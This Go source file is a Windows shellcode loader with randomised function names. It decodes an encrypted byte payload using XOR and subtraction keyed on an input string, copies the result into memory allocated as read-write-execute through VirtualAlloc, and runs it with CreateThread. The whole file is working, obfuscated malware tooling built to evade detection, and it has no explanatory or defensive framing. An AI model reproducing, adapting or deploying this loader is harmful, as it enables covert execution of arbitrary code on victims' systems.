package main

import (
	
	"syscall"
	"unsafe"
)

func dkx7N9eCL9GaskWfwxjWf4UbGp(input string, sc []byte) []byte{
  for i:=0;i<len(sc);i++{
	sc[i]= sc[i]-2
    sc[i]= sc[i]^input[0]
    sc[i]= sc[i]-1
    sc[i]= sc[i]^input[1]
  }
  return sc
}
func Z2JEqRKSdxHoRaSCjUshuqZUVD(input string)  {
	
	enc_shellcode := []byte{8, 5, 7, 6, 2, 17, 3, 3, 223, 179, input[5]*3, 188, 80, 103, 162, 2, input[15], 22, 51, 51, 40, 223, 51, 172, 103, 162, 52, 221, 10, 104, 221, 13, 92, 221, 13, 68, 221, 77, 221, 77, 221, 13, 72, 223, 11, 176, 221, 21, 108, 87, 144, 221, 24, input[13], 87, 144, 221, 32, 116, 87, 143, 223, 27, 164, 221, 48, 120, 87, 153, 223, 43, 168, 221, 8, 76, 87, 142, 223, 3, 188, 221, 8, 68, 103, 152, 221, 43, 168, 221, 35, 172, 103, 159, 172, 221, 108, 225, 87, 153, 50, 213, 151, 84, 165, 242, 36, 91, 24, 111, 136, 38, 179, 213, 148, 114, 191, 255, 88, 88, 88, 221, 27, 164, 221, 3, 188, 50, 221, 84, 23, 221, 84, 214, 87, 144, 64, 164, 87, 88, 88, 64, 192, 85, 88, 88, 185, 136, 213, 148, 96, 3, 223, 179, 213, 188, 80, 103, 162, 2, 64, 51, 37, 37, 88, 64, 8, 38, 9, 53, 64, 19, 48, 63, 36, 223, 51, 172, 103, 162, 52, 221, 10, 104, 221, 13, 92, 221, 13, 68, 221, 77, 221, 77, 221, 13, 72, 223, 11, 176, 221, 21, 108, 87, 144, 221, 24, 48, 87, 144, 221, 32, 116, 87, 143, 223, 27, 164, 221, 48, 120, 87, 153, 223, 43, 168, 221, 8, 76, 87, 142, 223, 3, 188, 221, 8, 68, 103, 152, 221, 43, 168, 221, 35, 172, 103, 159, 172, 221, 108, 225, 87, 153, 50, 213, 151, 84, 165, 242, 36, 94, 24, 111, 136, 38, 179, 213, 148, 114, 189, 69, 221, 27, 164, 221, 3, 188, 50, 221, 84, 23, 221, 84, 214, 87, 144, 62, 88, 185, 136, 11, 25, 10, 14, 15, 13, 16, 149,}

	shellcode:= dkx7N9eCL9GaskWfwxjWf4UbGp(input, enc_shellcode)

	
	const (
		MEM_COMMIT     = 0x1000
		MEM_RESERVE    = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")

	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		panic(err)
	}


	shellcode_addr := addr
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(shellcode_addr + uintptr(i))) = shellcode[i]
	}

	create_Thread := kernel32.MustFindProc("CreateThread")
	thread, _, err := create_Thread.Call(0, 0, shellcode_addr, 0, 0, 0)
	if thread == 0 {
		panic(err)
	}

	wait_for_Single_object := kernel32.MustFindProc("WaitForSingleObject")
	wait_for_Single_object.Call(thread, 0xFFFFFFFF)
	return
}
